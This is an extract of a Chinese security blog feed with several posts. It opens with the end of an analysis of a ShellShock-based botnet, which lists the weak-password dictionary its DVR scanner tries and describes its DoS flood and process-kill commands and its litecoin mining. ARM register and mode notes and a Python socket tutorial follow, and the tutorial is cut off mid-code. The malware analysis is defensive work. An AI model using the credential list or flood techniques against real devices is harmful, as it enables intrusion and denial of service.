<p>DVR Scanner主要测试目标是否存在DVR漏洞,如果存在则尝试通过像”root”,”12345”这样的弱口令进行进行连接,如果连接成功,则执行ps尝试寻找”cmd.so”进程,该进程主要是莱特币矿工相关.</p>
<p>于是可以高度怀疑通过此方法来挖取莱特币</p>
<p>程序中存在的弱口令表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">root </div><div class="line">admin </div><div class="line">user </div><div class="line">login </div><div class="line">guest </div><div class="line">toor </div><div class="line">changeme </div><div class="line">1234 </div><div class="line">12345 </div><div class="line">123456 </div><div class="line">default </div><div class="line">pass </div><div class="line">password</div></pre></td></tr></table></figure>
<p><strong>●HOLD (Dos Flood)</strong></p>
<p><a href="http://image.3001.net/images/20140929/14119558398157.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558398157.png%21small" alt="对目标服务器进行Hold洪水攻击"></a></p>
<p>对目标服务器进行Hold洪水攻击,通过接受服务器数据包,来指明需要攻击的秒数,并将攻击时间返回给服务器</p>
<p><strong>●JUNK (DoS Flood) </strong></p>
<p><a href="http://image.3001.net/images/20140929/14119558506793.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558506793.png%21small" alt="对目标服务器进行JUNK洪水攻击"></a></p>
<p>对目标服务器进行JUNK洪水攻击</p>
<p><strong>●UDP (DoS Flood)</strong> </p>
<p><a href="http://image.3001.net/images/20140929/14119558625359.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558625359.png%21small" alt="对目标服务器进行UDP洪水攻击"></a></p>
<p>对目标服务器进行UDP洪水攻击</p>
<p><strong>●TCP (DoS Flood) </strong></p>
<p><a href="http://image.3001.net/images/20140929/14119558712704.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558712704.png%21small" alt="对目标服务器进行TCP洪水攻击"></a></p>
<p>对目标服务器进行TCP洪水攻击</p>
<p><strong>●KILLATTK </strong></p>
<p><a href="http://image.3001.net/images/20140929/14119558833165.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558833165.png%21small" alt="通过接受服务器发来的进程列表,通过kill系统调用杀掉指定的进程"></a></p>
<p>通过接受服务器发来的进程列表,通过kill系统调用杀掉指定的进程</p>
<p><strong>●LOLNOGTFO</strong></p>
<p><a href="http://image.3001.net/images/20140929/14119558966991.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558966991.png%21small" alt="非法服务器数据包指令"></a></p>
<p>非法服务器数据包指令</p>
<h2 id="三-后台漏洞检测"><a href="#三-后台漏洞检测" class="headerlink" title="三.后台漏洞检测"></a><strong>三.后台漏洞检测</strong></h2><p>漏洞爆发之后,我们在后台对全国范围内的相关网站进行了一次统计,我们发现了某公司的NAS设备管理页面存在cgi漏洞,而通过查看网站页面，发现设备是类似“TS-119P”， 设备名都是TS-XX的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">备注：NAS是一种网络存储设备，现在的很多路由器也支持此功能，如果此设备有漏洞，那么里面的资源都会有被盗的风险。XXX门将会再现江湖</div></pre></td></tr></table></figure>
<p>为此我们搭建了一个后台页面,来对网址进行检测,查看是否存在Bash漏洞</p>
<p><a href="http://image.3001.net/images/20140929/14119559071040.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119559071040.png%21small" alt="ShellShock检测页面"></a></p>
<p><strong>检测网址如下:</strong></p>
<p><a href="http://fish.ijinshan.com/cgibincheck" target="_blank" rel="external">http://fish.ijinshan.com/cgibincheck</a></p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
            <tag> shell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ARM寄存器结构小记]]></title>
      <url>/2017/09/08/ARM%E5%AF%84%E5%AD%98%E5%99%A8%E7%BB%93%E6%9E%84%E5%B0%8F%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>ARM处理器共有37个寄存器，被分为若干个组，这些寄存器包括：</p>
<ul>
<li>31个通用寄存器，包括未分组寄存器R0-R7、分组寄存器R8-R14和程序计数器（ PC 指针），均为32位的寄存器。</li>
<li>6个状态寄存器，包括程序状态寄存器 CPSR 和5个物理状态寄存器 SPSR （用以异常发生时保存 CPSR 的值，异常退出时恢复 CPSR ）。 这些状态寄存器用以标识 CPU 的工作状态及程序的运行状态，均为32位。</li>
</ul>
<p>具体如下表所示：</p>
<table>
<thead>
<tr>
<th>用户模式 usr</th>
<th>系统模式 sys</th>
<th>特权模式 svc</th>
<th>中止模式 abt</th>
<th>未定义指令模式 und</th>
<th>外部中断模式 irq</th>
<th>快速中断模式 fiq</th>
</tr>
</thead>
<tbody>
<tr>
<td>R0</td>
<td>R0</td>
<td>R0</td>
<td>R0</td>
<td>R0</td>
<td>R0</td>
<td>R0</td>
</tr>
<tr>
<td>R1</td>
<td>R1</td>
<td>R1</td>
<td>R1</td>
<td>R1</td>
<td>R1</td>
<td>R1</td>
</tr>
<tr>
<td>R2</td>
<td>R2</td>
<td>R2</td>
<td>R2</td>
<td>R2</td>
<td>R2</td>
<td>R2</td>
</tr>
<tr>
<td>R3</td>
<td>R3</td>
<td>R3</td>
<td>R3</td>
<td>R3</td>
<td>R3</td>
<td>R3</td>
</tr>
<tr>
<td>R4</td>
<td>R4</td>
<td>R4</td>
<td>R4</td>
<td>R4</td>
<td>R4</td>
<td>R4</td>
</tr>
<tr>
<td>R5</td>
<td>R5</td>
<td>R5</td>
<td>R5</td>
<td>R5</td>
<td>R5</td>
<td>R5</td>
</tr>
<tr>
<td>R6</td>
<td>R6</td>
<td>R6</td>
<td>R6</td>
<td>R6</td>
<td>R6</td>
<td>R6</td>
</tr>
<tr>
<td>R8</td>
<td>R8</td>
<td>R8</td>
<td>R8</td>
<td>R8</td>
<td>R8</td>
<td>R8_fiq</td>
</tr>
<tr>
<td>R9</td>
<td>R9</td>
<td>R9</td>
<td>R9</td>
<td>R9</td>
<td>R9</td>
<td>R9_fiq</td>
</tr>
<tr>
<td>R10</td>
<td>R10</td>
<td>R10</td>
<td>R10</td>
<td>R10</td>
<td>R10</td>
<td>R10_fiq</td>
</tr>
<tr>
<td>R11</td>
<td>R11</td>
<td>R11</td>
<td>R11</td>
<td>R11</td>
<td>R11</td>
<td>R11_fiq</td>
</tr>
<tr>
<td>R12</td>
<td>R12</td>
<td>R12</td>
<td>R12</td>
<td>R12</td>
<td>R12</td>
<td>R12_fiq</td>
</tr>
<tr>
<td>R13(SP)</td>
<td>R13</td>
<td>R13_svc</td>
<td>R13_abt</td>
<td>R13_und</td>
<td>R13_inq</td>
<td>R13_fiq</td>
</tr>
<tr>
<td>R14(LR)</td>
<td>R14</td>
<td>R14_svc</td>
<td>R14_abt</td>
<td>R14_und</td>
<td>R14_inq</td>
<td>R14_fiq</td>
</tr>
<tr>
<td>PC(R15)</td>
<td>PC</td>
<td>PC</td>
<td>PC</td>
<td>PC</td>
<td>PC</td>
<td>PC</td>
</tr>
<tr>
<td>CPSR</td>
<td>CPSR</td>
<td>CPSR</td>
<td>CPSR</td>
<td>CPSR</td>
<td>CPSR</td>
<td>CPSR</td>
</tr>
<tr>
<td></td>
<td></td>
<td>SPSR_svc</td>
<td>SPSR_abt</td>
<td>SPSR_und</td>
<td>SPSR_inq</td>
<td>SPSR_fiq</td>
</tr>
</tbody>
</table>
<h2 id="未分组寄存器-R0-R7："><a href="#未分组寄存器-R0-R7：" class="headerlink" title="未分组寄存器 R0 - R7："></a>未分组寄存器 R0 - R7：</h2><p>对于未分组寄存器，它们没有被系统用于特别的用途，因此任何可采用通用寄存器的应用场合都可以使用未分组寄存器。<br>但需要注意一点，未分组寄存器不会因为处理器模式的改变而更改指向的寄存器，因此在所有的处理器模式下未分组寄存器都指向同一个寄存器，当中断或异常处理造成处理器模式转换的时候，由于不同的处理器模式使用了相同的物理寄存器，这就有可能造成寄存器中的数据被破坏。 </p>
<h2 id="分组寄存器-R8-R14"><a href="#分组寄存器-R8-R14" class="headerlink" title="分组寄存器 R8 - R14"></a>分组寄存器 R8 - R14</h2><p>对于分组寄存器，它们每一次所访问的物理寄存器和处理器当前的运行模式有关。例如在快速中断模式 fiq下R8-R12访问寄存器 R8_fiq-R12_fiq ；而在其他模式下又访问 R8_usr-R12_usr 。因此它们每个对应着两个不同的寄存器。</p>
<p>对于R13（SP）、R14（LR）来说，每个寄存器对应着6个不同的物理寄存器，其中的一个是用户模式与系统模式共用，另外5个物理寄存器对应于其他5种不同的运行模式。采用以下的记号来区分不同的物理寄存器：<br>R13_&lt; mode &gt;<br>R14_&lt; mode &gt;<br>其中，mode为以下几种模式之一：usr、fiq、irq、svc、abt、und。</p>
<h3 id="R13（SP）"><a href="#R13（SP）" class="headerlink" title="R13（SP）"></a>R13（SP）</h3><p>寄存器 R13 在 ARM 指令还有着一个非常重要的作用，通常他被用作堆栈指针，当然这只是一种习惯用法，用户也可以使用其他的寄存器作为堆栈指针，但在Thumb指令集中，某些指令强制性地要求使用R13作为堆栈指针。</p>
<p>由于处理器的每种运行模式均有自己福利的物理寄存器R13，使其指向该运行模式下的栈空间，这样，当程序的运行进入异常模式时，可以将需要保护的寄存器放入R13所指向的堆栈，而当程序从异常模式返回时，则从对应的堆栈恢复，采用这种方式可以保证异常发生后程序的正常执行。</p>
<h3 id="R14（LR）"><a href="#R14（LR）" class="headerlink" title="R14（LR）"></a>R14（LR）</h3><p>R14 也称作子程序连接寄存器（Subroutine Link Register）或连接寄存器 LR 。当执行 BL 子程序调用指令时，R14 中得到 R15 （程序计数器PC）的备份。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0x00008d68 &lt;+44&gt;:    bl  0x8cd4 &lt;func&gt;</div><div class="line">0x00008d6c &lt;+48&gt;:    ...</div><div class="line">0x00008d70 &lt;+52&gt;:    ...123</div></pre></td></tr></table></figure>
<p>通常情况下，在汇编代码中不会出现 R14 中产生 PC 备份的指令语句。可以简单的理解为在执行调用的同时，将当前 PC 的指向的值 0x00008d70 减去一条指令的长度，这里是ARM工作状态，指令长度为 0x00000004，并交由R14保存。减去一条指令的原因很简单，不减的话返回的时候中间 0x00008d6c 处的那条指令就被跳过了。</p>
<font color="#f00">（当前执行的是 0x00008d68 处的指令，0x00008d6c 处的指令处于译码阶段，0x00008d70 的指令处于取指阶段，PC总是指向取指阶段的指令。关于  ARM 处理器的流水线机制和 PC 指向的值 详见下文。） </font>

<p> 其他情况下，R14 也可以用作通用寄存器。与之类似，当发生中断或异常时，对应的分组寄存器 R14_svc、R14_irq、R14_fiq、R14_abt 和 R14_und 用来保存 R15 的返回值。</p>
<p>每一种处理器模式在自己的物理 R14 中存放当前子程序的返回地址。当通过BL、BX 等指令调用子程序时，R14就被设置成该子程序的返回地址。例如有汇编指令如下：</p>
<ul>
<li>执行以下任意一条指令：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">MOV PC，LR</div><div class="line">BX LR12</div></pre></td></tr></table></figure>
<ul>
<li>在子程序入口处使用以下指令将R14存入堆栈：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">STMFD SP！,&#123;&lt;Regs&gt;,LR&#125;1</div></pre></td></tr></table></figure>
<ul>
<li>对应的，使用以下指令可以完成子程序返回：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LDMFD SP！,&#123;&lt;Regs&gt;,PC&#125;1</div></pre></td></tr></table></figure>
<p>当发生异常中断的时候，该模式下的特定物理R14被设置成该异常模式将要返回的地址。</p>
<h3 id="R15（PC）"><a href="#R15（PC）" class="headerlink" title="R15（PC）"></a>R15（PC）</h3><p>介绍R15之前先简单了解一下 ARM 处理器的是流水线机制。 ARM7 处理器采用3级流水线来增加处理器指令流的速度，能提供 0.9MIPS/MHz 的指令处理速度。</p>
<p>ARM7 的流水线有3个阶段，因此指令分3个阶段执行。<br>⑴ 取指从存储器装载一条指令<br>⑵ 译码识别将要被执行的指令<br>⑶ 执行处理指令并将结果写会寄存器</p>
<p>对于x86处理器来说，只有完成一条指令的读取和执行后，才会执行下一条指令。这样， PC 始终指向的正在“执行”的指令。<br>而对于 ARM7 来说因为是3级流水线，所以把指令的处理分为了上面所述的3个阶段。所以处理时实际是这样的： ARM 正在执行第1条指令的同时对第2条指令进行译码，并将第3条指令从存储器中取出。因此 ARM7 流水线只有在取第4条指令时，第1条指令才算完成执行。继而 ARM 的 PC 寄存器永远指向当前执行的指令后的第二条指令，即处于取指阶段的指令。</p>
<p>另外，在ARM状态下，最低的两位[1:0]为0，其他位[31:2]用于保存PC；在Thumb状态下，最低位[0]为0，其他位 [31:1]用于保存PC；所以 R15（PC）虽然可以用作通用寄存器，但是有一些指令在使用R15时有一些特殊限制，当违反了这些限制时，程序的执行结果是未知的。</p>
<h3 id="R16（CPSR）"><a href="#R16（CPSR）" class="headerlink" title="R16（CPSR）"></a>R16（CPSR）</h3><p>寄存器R16用作当前程序状态寄存器 CPSR （Current Program Status Register），可在任何运行模式下被访问，它包括条件标志位、中断禁止位、当前处理器模式标志位，以及其他一些相关的控制和状态位。</p>
<p>每一种运行模式下又都有一个专用的物理状态寄存器，称为备份的程序状态寄存器 SPSR （Saved Program Status Register），当异常发生时， SPSR 用于保存 CPSR 的当前值，从异常退出时则可由 SPSR 来恢复 CPSR 。</p>
<p>由于用户模式和系统模式不属于异常模式，他们没有 SPSR ，当在这两种模式下访问 SPSR ，结果是未知的。</p>
<h3 id="执行条件标志位"><a href="#执行条件标志位" class="headerlink" title="执行条件标志位"></a>执行条件标志位</h3><p>ARM 的执行条件与 x86 下面的标志位有些类似，系统通过对这些标志位的判断来确定是否满足执行条件。几乎所有的 ARM 指令都包含一个4位的条件码，位于指令的最高4位。条件码共有16种，每种条件码可用两个字符表示，这两个字符可以添加在指令助记符的后面和指令同时使用。</p>
<p>例如，跳转指令 B 可以加上后缀 EQ 变成 BEQ 表示“相同则跳转”，即当 CPSR 中的Z标志置位时发生跳转。在16种条件标志码中，只有15种可以使用，如下表所示。第十六种（1111）为系统保留，暂时不能使用。</p>
<table>
<thead>
<tr>
<th>编 码</th>
<th>条件助记符</th>
<th>标志位</th>
<th>含 义</th>
</tr>
</thead>
<tbody>
<tr>
<td>0000</td>
<td>EQ</td>
<td>Z=1</td>
<td>相等</td>
</tr>
<tr>
<td>0001</td>
<td>NE</td>
<td>Z=0</td>
<td>不相等</td>
</tr>
<tr>
<td>0010</td>
<td>CS</td>
<td>C=1</td>
<td>无符号大于或等于</td>
</tr>
<tr>
<td>0011</td>
<td>CC</td>
<td>C=0</td>
<td>无符号小于</td>
</tr>
<tr>
<td>0100</td>
<td>MI</td>
<td>N=1</td>
<td>负值</td>
</tr>
<tr>
<td>0101</td>
<td>PL</td>
<td>N=0</td>
<td>正值或 0</td>
</tr>
<tr>
<td>0110</td>
<td>VS</td>
<td>V=1</td>
<td>溢出</td>
</tr>
<tr>
<td>0111</td>
<td>VC</td>
<td>V=0</td>
<td>无溢出</td>
</tr>
<tr>
<td>1000</td>
<td>HI</td>
<td>C=1 且 Z=0</td>
<td>无符号大于</td>
</tr>
<tr>
<td>1001</td>
<td>LS</td>
<td>C=0 且 Z=1</td>
<td>无符号小于或等于</td>
</tr>
<tr>
<td>1010</td>
<td>GE</td>
<td>N 和 V 相同</td>
<td>有符号大于或等于</td>
</tr>
<tr>
<td>1011</td>
<td>LT</td>
<td>N 和 V 不相同</td>
<td>有符号小于</td>
</tr>
<tr>
<td>1100</td>
<td>GT</td>
<td>Z=0 且 N 等于 V</td>
<td>有符号大于</td>
</tr>
<tr>
<td>1101</td>
<td>LE</td>
<td>Z=1 且 N 不等于 V</td>
<td>有符号小于或等于</td>
</tr>
<tr>
<td>1110</td>
<td>AL</td>
<td>任意</td>
<td>无条件执行（不推荐使用）</td>
</tr>
<tr>
<td>1111</td>
<td>NV</td>
<td>任意</td>
<td>从不执行（不要使用）</td>
</tr>
</tbody>
</table>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> arm </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ARM状态结构小记]]></title>
      <url>/2017/09/08/ARM%E7%8A%B6%E6%80%81%E7%BB%93%E6%9E%84%E5%B0%8F%E8%AE%B0/</url>
      <content type="html"><![CDATA[<blockquote>
<p>在系统学习ARM寄存器结构和功能之前，有必要先了解一下ARM的工作模式和工作状态。</p>
</blockquote>
<h2 id="一、-ARM的工作状态"><a href="#一、-ARM的工作状态" class="headerlink" title="一、 ARM的工作状态"></a>一、 ARM的工作状态</h2><p>两种状态为：</p>
<ul>
<li>ARM状态（32位）</li>
<li>Thumb状态（16位）</li>
</ul>
<p>用BX Rn指令来进行两种状态的切换：<br>其中BX是跳转指令，Rn是寄存器，如果Rn的位0为1（最低位），则进入Thumb状态；如果Rn的位为0，这进入ARM状态。（ARM指令的后两位始终为0，没有被使用；而Thumb指令的后一位始终为0，没有被使用，因此采用位0来表示ARM指令与Thumb指令的切换标志位。）</p>
<p>例如下面两个指令就可以实现从ARM状态切换到Thumb状态，第一条指令将r6寄存器最低位置为1，接着 <code>bx  r6</code> 就切换到了Thumb状态。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">……</div><div class="line">0x00008cfc &lt;+12&gt;:    add r6, pc, #1</div><div class="line">0x00008d00 &lt;+16&gt;:    bx  r6</div><div class="line">0x00008d04 &lt;+20&gt;:    ...</div><div class="line">0x00008d06 &lt;+22&gt;:    ...</div><div class="line">0x00008d08 &lt;+24&gt;:    ...</div><div class="line">……1234567</div></pre></td></tr></table></figure>
<p>注：ARM和Thumb两种状态之间的切换不影响处理器的工作模式和寄存器的内容；ARM处理器在处理异常时，不过处理器处于什么状态，则都将切换到ARM状态。</p>
<p>对于 ARM 指令来说，所有的指令长度都是 32 位，并且执行周期大多为单周期，指令都是有条件执行的。<br>而 Thumb 指令的特点如下：</p>
<ul>
<li>指令执行条件经常不回使用。</li>
<li>源寄存器与目标寄存器经常是相同的。</li>
<li>使用的寄存器数量比较少。</li>
<li>常数的值比较小。</li>
<li>内核中的桶式移动器（barrel shifter）经常是不使用的。</li>
</ul>
<p>也就是说 16 位的 Thumb 指令一般可以完成 和 32 位 ARM 指令相同的任务。Thumb指令是ARM指令的子集，只要遵循一定的调用规则就可以互相调用。<br>Thumb指令与ARM指令的时间效率和空间效率关系为：</p>
<ul>
<li>存储空间约为ARM代码的60％～70％</li>
<li>指令数比ARM代码多约30％～40％</li>
<li>存储器为32位时ARM代码比Thumb代码快约40％</li>
<li>存储器为16位时Thumb比ARM代码快约40～50％</li>
<li>使用Thumb代码，存储器的功耗会降低约30％</li>
</ul>
<h2 id="二、-ARM的工作模式"><a href="#二、-ARM的工作模式" class="headerlink" title="二、 ARM的工作模式"></a>二、 ARM的工作模式</h2><p>七种工作模式为：</p>
<ul>
<li>usr 用户模式：正常用户模式，程序正常执行模式</li>
<li>sys 系统模式：(基本上等同于usr)（System）运行特权操作系统任务</li>
<li>svc 特权模式：（Supervisor）也叫操作系统保护模式，处理软件中断swi  reset</li>
<li>abt 中止模式：（Abort mode）{数据、指令} 处理存储器故障、实现虚拟存储器和存储器保护</li>
<li>und 未定义指令模式：（Undefined）处理未定义的指令陷阱，支持硬件协处理器的软件仿真</li>
<li>irq 外部中断模式：处理普通中断</li>
<li>fiq 快速中断模式：（Fast Interrupt Request）处理快速中断，支持高速数据传送或通道处理</li>
</ul>
<p>上述七种工作模式中，除了用户模式之外的其他6种处理器模式称为特权模式。</p>
<p>特权模式下，程序可以访问所有的系统资源，也可以任意地进行处理器模式的切换。</p>
<p>特权模式中，除系统模式外，其他5种模式又称为异常模式。</p>
<p>大多数的用户程序运行在用户模式下，此时，应用程序不能够访问一些受操作系统保护的系统资源，应用程序也不能直接进行处理器模式的切换。</p>
<p>用户模式下，当需要进行处理器模式切换时，应用程序可以产生异常处理，在异常处理中进行处理器模式的切换。</p>
<h2 id="三、-关于状态和模式的切换"><a href="#三、-关于状态和模式的切换" class="headerlink" title="三、 关于状态和模式的切换"></a>三、 关于状态和模式的切换</h2><p>处理器模式可以通过软件进行切换，也可以通过外部中断或者异常处理过程进行切换。</p>
<p>当应用程序发生异常中断时，处理器进入相应的异常模式。在每一种异常模式下都有一组寄存器，供相应的异常处理程序使用，这样就可以保证在进入异常模式时，用户模式下的寄存器不被破坏。</p>
<p>系统模式并不是通过异常进入的，它和用户模式具有完全一样的寄存器。但是系统模式属于特权模式，可以访问所有的系统资源，也可以直接进行处理器模式切换。它主要供操作系统任务使用。通常操作系统的任务需要访问所有的系统资源，同时该任务仍然使用用户模式的寄存器组，而不是使用异常模式下相应的寄存器组，这样可以保证当异常中断发生时任务状态不被破坏。</p>
<p>Thumb指令低密度及窄存储器时性能高的特点使得其在大多数基于 C 代码的系统汇中有非常广泛的应用，但是有些场合中系统只能使用 ARM 指令，比如：</p>
<ol>
<li>如果对于速度有比较高的要求，ARM指令在宽存储器中会提供更高的性能。</li>
<li>某些功能只能由 ARM 指令来实现，例如访问 CPSR 寄存器来使能/禁止 中断或改变处理器工作模式；访问协处理器CP15；执行 C 代码不支持的 DSP 算术指令；异常中断（Exception）处理。</li>
</ol>
<p>另外，在进入异常中断后，内核会自动切换到 ARM 状态。即在异常中断处理程序人口的一些指令是ARM指令，然后根据需要，程序可以切换到 Thumb 工作状态，在异常中断处理程序返回前，程序在切换到 ARM 工作状态。</p>
<p>注：当处理器处于Thumb状态时发生异常（如irq、fiq、und、abt、svc等），则异常处理返回时，自动切换到Thumb状态。需要了解的是，ARM 处理器总是 从 ARM 工作状态开始执行的。因此，如果要在调试器重新运行 Thumb 程序，必须为 该 Thumb 程序添加一个 ARM程序头，然后再切换到Thumb工作状态调用该 Thumb程序。</p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> arm </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python socket编程]]></title>
      <url>/2017/09/04/python-socket%E7%BC%96%E7%A8%8B/</url>
      <content type="html"><![CDATA[<p>Python 提供了两个基本的 socket 模块。</p>
<p>   第一个是 Socket，它提供了标准的 BSD Sockets API。</p>
<p>   第二个是 SocketServer， 它提供了服务器中心类，可以简化网络服务器的开发。</p>
<p>下面讲的是Socket模块功能</p>
<h3 id="1、Socket-类型"><a href="#1、Socket-类型" class="headerlink" title="1、Socket 类型"></a>1、Socket 类型</h3><p>套接字格式：</p>
<p>socket(family,type[,protocal]) 使用给定的地址族、套接字类型、协议编号（默认为0）来创建套接字。</p>
<table>
<thead>
<tr>
<th><strong>socket类型</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>socket.AF_UNIX</td>
<td>只能够用于单一的Unix系统进程间通信</td>
</tr>
<tr>
<td>socket.AF_INET</td>
<td>服务器之间网络通信</td>
</tr>
<tr>
<td>socket.AF_INET6</td>
<td>IPv6</td>
</tr>
<tr>
<td>socket.SOCK_STREAM</td>
<td>流式socket , for TCP</td>
</tr>
<tr>
<td>socket.SOCK_DGRAM</td>
<td>数据报式socket , for UDP</td>
</tr>
<tr>
<td>socket.SOCK_RAW</td>
<td>原始套接字，普通的套接字无法处理ICMP、IGMP等网络报文，而SOCK_RAW可以；其次，SOCK_RAW也可以处理特殊的IPv4报文；此外，利用原始套接字，可以通过IP_HDRINCL套接字选项由用户构造IP头。</td>
</tr>
<tr>
<td>socket.SOCK_SEQPACKET</td>
<td>可靠的连续数据包服务</td>
</tr>
<tr>
<td>创建TCP Socket：</td>
<td>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)()</td>
</tr>
<tr>
<td>创建UDP Socket：</td>
<td>s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</td>
</tr>
</tbody>
</table>
<h3 id="2、Socket-函数"><a href="#2、Socket-函数" class="headerlink" title="2、Socket 函数"></a>2、Socket 函数</h3><p>注意点:</p>
<p>1）TCP发送数据时，已建立好TCP连接，所以不需要指定地址。UDP是面向无连接的，每次发送要指定是发给谁。</p>
<p>2）服务端与客户端不能直接发送列表，元组，字典。需要字符串化repr(data)。</p>
<table>
<thead>
<tr>
<th><strong>socket函数</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>服务端socket函数</strong></td>
<td></td>
</tr>
<tr>
<td>s.bind(address)</td>
<td>将套接字绑定到地址, 在AF_INET下,以元组（host,port）的形式表示地址.</td>
</tr>
<tr>
<td>s.listen(backlog)</td>
<td>开始监听TCP传入连接。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。</td>
</tr>
<tr>
<td>s.accept()</td>
<td>接受TCP连接并返回（conn,address）,其中conn是新的套接字对象，可以用来接收和发送数据。address是连接客户端的地址。</td>
</tr>
<tr>
<td><strong>客户端socket函数</strong></td>
<td></td>
</tr>
<tr>
<td>s.connect(address)</td>
<td>连接到address处的套接字。一般address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。</td>
</tr>
<tr>
<td>s.connect_ex(adddress)</td>
<td>功能与connect(address)相同，但是成功返回0，失败返回errno的值。</td>
</tr>
<tr>
<td><strong>公共socket函数</strong></td>
<td></td>
</tr>
<tr>
<td>s.recv(bufsize[,flag])</td>
<td>接受TCP套接字的数据。数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。</td>
</tr>
<tr>
<td>s.send(string[,flag])</td>
<td>发送TCP数据。将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。</td>
</tr>
<tr>
<td>s.sendall(string[,flag])</td>
<td>完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。</td>
</tr>
<tr>
<td>s.recvfrom(bufsize[.flag])</td>
<td>接受UDP套接字的数据。与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。</td>
</tr>
<tr>
<td>s.sendto(string[,flag],address)</td>
<td>发送UDP数据。将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。</td>
</tr>
<tr>
<td>s.close()</td>
<td>关闭套接字。</td>
</tr>
<tr>
<td>s.getpeername()</td>
<td>返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。</td>
</tr>
<tr>
<td>s.getsockname()</td>
<td>返回套接字自己的地址。通常是一个元组(ipaddr,port)</td>
</tr>
<tr>
<td>s.setsockopt(level,optname,value)</td>
<td>设置给定套接字选项的值。</td>
</tr>
<tr>
<td>s.getsockopt(level,optname[.buflen])</td>
<td>返回套接字选项的值。</td>
</tr>
<tr>
<td>s.settimeout(timeout)</td>
<td>设置套接字操作的超时期，timeout是一个浮点数，单位是秒。值为None表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如connect()）</td>
</tr>
<tr>
<td>s.gettimeout()</td>
<td>返回当前超时期的值，单位是秒，如果没有设置超时期，则返回None。</td>
</tr>
<tr>
<td>s.fileno()</td>
<td>返回套接字的文件描述符。</td>
</tr>
<tr>
<td>s.setblocking(flag)</td>
<td>如果flag为0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用recv()没有发现任何数据，或send()调用无法立即发送数据，那么将引起socket.error异常。</td>
</tr>
<tr>
<td>s.makefile()</td>
<td>创建一个与该套接字相关连的文件</td>
</tr>
</tbody>
</table>
<h3 id="3、socket编程思路"><a href="#3、socket编程思路" class="headerlink" title="3、socket编程思路"></a>3、socket编程思路</h3><p>TCP服务端：</p>
<p>1 创建套接字，绑定套接字到本地IP与端口</p>
<p> socket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.bind()</p>
<p>2 开始监听连接                   #s.listen()</p>
<p>3 进入循环，不断接受客户端的连接请求              #s.accept()</p>
<p>4 然后接收传来的数据，并发送给对方数据         #s.recv() , s.sendall()</p>
<p>5 传输完毕后，关闭套接字                     #s.close()</p>
<p>TCP客户端:</p>
<p>1 创建套接字，连接远端地址</p>
<p>​       # socket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.connect()</p>
<p>2 连接后发送数据和接收数据          # s.sendall(), s.recv()</p>
<p>3 传输完毕后，关闭套接字          #s.close()</p>
<h3 id="4、Socket编程之服务端代码："><a href="#4、Socket编程之服务端代码：" class="headerlink" title="4、Socket编程之服务端代码："></a>4、Socket编程之服务端代码：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">root@yangrong:/python<span class="comment"># cat 